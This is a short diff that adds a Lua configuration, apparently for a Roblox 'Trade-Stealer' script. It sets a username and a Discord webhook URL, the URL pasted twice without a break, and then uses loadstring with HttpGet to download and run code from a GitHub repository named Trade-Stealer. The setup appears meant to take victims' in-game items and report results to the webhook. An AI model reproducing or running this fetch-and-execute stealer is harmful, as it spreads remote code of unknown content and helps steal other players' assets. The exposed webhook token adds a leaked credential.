@@ -1,0 +1,4 @@
+Username = aquihebert
+Webhook = https://discord.com/api/webhooks/1344463241711059016/_4MtlV5hbynv4N9vrbQ_U3XCs6NOsFaS_9eti-wimz_TS7xBWQZ6pu4vSJCFi_kx9JPshttps://discord.com/api/webhooks/1344463241711059016/_4MtlV5hbynv4N9vrbQ_U3XCs6NOsFaS_9eti-wimz_TS7xBWQZ6pu4vSJCFi_kx9JPs
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Trade-Stealer/Universal/refs/heads/main/Roblox"))()
